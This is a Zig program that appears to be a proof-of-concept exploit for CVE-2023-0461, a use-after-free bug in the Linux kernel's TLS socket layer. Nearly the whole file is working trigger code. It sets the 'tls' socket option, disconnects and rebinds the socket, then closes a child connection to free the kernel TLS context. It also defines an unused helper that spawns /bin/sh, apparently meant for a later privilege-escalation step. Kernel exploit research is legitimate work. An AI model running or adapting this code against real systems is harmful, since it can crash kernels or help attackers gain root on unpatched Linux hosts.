const std = @import("std");
const assert = std.debug.assert;
const log = std.log;
const net = std.net;
const os = std.os;
const errno = os.errno;
const l = os.linux;
const E = l.E;
const mem = std.mem;
const Allocator = mem.Allocator;

const SOL = struct {
    pub const TCP = 6;
};

const TLS = struct {
    pub const TX = 1;
    pub const RX = 2;
};

const CipherType = enum(u16) {
    AESGCM128 = 51,
};

const Version = enum(u16) {
    TLS12 = 0x0303,
    TLS13 = 0x0304,
};

const TLSCryptoInfo = extern struct {
    version: Version,
    cipher_type: CipherType,
};

const AESGCM128 = extern struct {
    info: TLSCryptoInfo,
    iv: [8]u8,
    key: [16]u8,
    salt: [4]u8,
    rec_seq: [8]u8,
};

comptime {
    assert(@sizeOf(AESGCM128) == 40);
}

const TLSProtInfo = extern struct {
    version: Version,
    cipher_type: CipherType,
    prepend_size: u16,
    tag_size: u16,
    overhead_size: u16,
    iv_size: u16,
    salt_size: u16,
    rec_seq_size: u16,
    aad_size: u16,
    tail_size: u16,
};

comptime {
    assert(@sizeOf(TLSProtInfo) == 20);
}

const TLSContext = extern struct {
    prot_info: TLSProtInfo,
};

fn retry_connect(sock: os.socket_t, sock_addr: *const os.sockaddr, len: os.socklen_t) !void {
    var n: u8 = 100;
    var last_err: os.ConnectError = undefined;

    while (n > 0) : (n -= 1) {
        os.connect(sock, sock_addr, len) catch |err| {
            last_err = err;
            os.nanosleep(0, 100000);

            continue;
        };

        return;
    }

    return last_err;
}

const Direction = enum(u32) {
    TX = TLS.TX,
    RX = TLS.RX,
};

fn setTLSOpt(sk: os.socket_t, dir: Direction) !void {
    const crypto = AESGCM128{
        .info = .{
            .version = .TLS13,
            .cipher_type = .AESGCM128,
        },
        .iv = .{ 'i', 'v' } ** 4,
        .key = .{ 'k', 'y' } ** 8,
        .salt = .{ 's', 'a', 'l', 't' },
        .rec_seq = .{ 'r', 's' } ** 4,
    };

    try os.setsockopt(sk, l.SOL.TLS, @intFromEnum(dir), mem.asBytes(&crypto));
}

fn sh() !void {
    const allc = std.heap.page_allocator;
    var child = std.process.Child.init(&[_][]const u8{"/bin/sh"}, allc);

    _ = try child.spawnAndWait();
}

fn cve_2023_0461() !void {
    const server_addr = try net.Ip4Address.parse("127.0.0.1", 0xf00b);
    const server_addr_p: *const l.sockaddr = @ptrCast(&server_addr.sa);
    const target_addr = try net.Ip4Address.parse("127.0.0.1", 0xdead);
    const target_addr_p: *const l.sockaddr = @ptrCast(&target_addr.sa);
    const unspec_addr = l.sockaddr{ .family = l.AF.UNSPEC, .data = undefined };
    const addr_sz = @sizeOf(@TypeOf(server_addr.sa));

    const child_pid = try os.fork();

    if (child_pid == 0) {
        log.info("child: listen for first connection", .{});
        {
            const server_sk = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
            defer os.closeSocket(server_sk);

            try os.bind(server_sk, server_addr_p, addr_sz);
            try os.listen(server_sk, 1);

            const client_sk = try os.accept(server_sk, null, null, 0);
            os.closeSocket(client_sk);
        }

        log.info("child: connect for second connection", .{});
        const client_sk = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
        defer os.closeSocket(client_sk);
        try retry_connect(client_sk, target_addr_p, addr_sz);

        const client_sk2 = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
        defer os.closeSocket(client_sk2);
        try retry_connect(client_sk2, target_addr_p, addr_sz);

        var buf: [192]u8 = undefined;
        _ = try os.read(client_sk2, &buf);

        return;
    }

    defer _ = os.waitpid(child_pid, 0);

    log.info("parent: connect for first connection", .{});
    const target_sk = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
    defer os.closeSocket(target_sk);

    try retry_connect(target_sk, server_addr_p, addr_sz);
    try os.setsockopt(target_sk, SOL.TCP, l.TCP.ULP, "tls");

    try os.connect(target_sk, &unspec_addr, @sizeOf(@TypeOf(unspec_addr)));
    try os.bind(target_sk, target_addr_p, addr_sz);

    log.info("parent: listen for second connection", .{});

    try os.listen(target_sk, 1);

    const client_sk = try os.accept(target_sk, null, null, 0);
    log.info("parent: free the context", .{});
    os.closeSocket(client_sk);

    log.info("Goodbye!", .{});
}

pub fn main() !void {
    try cve_2023_0461();
}
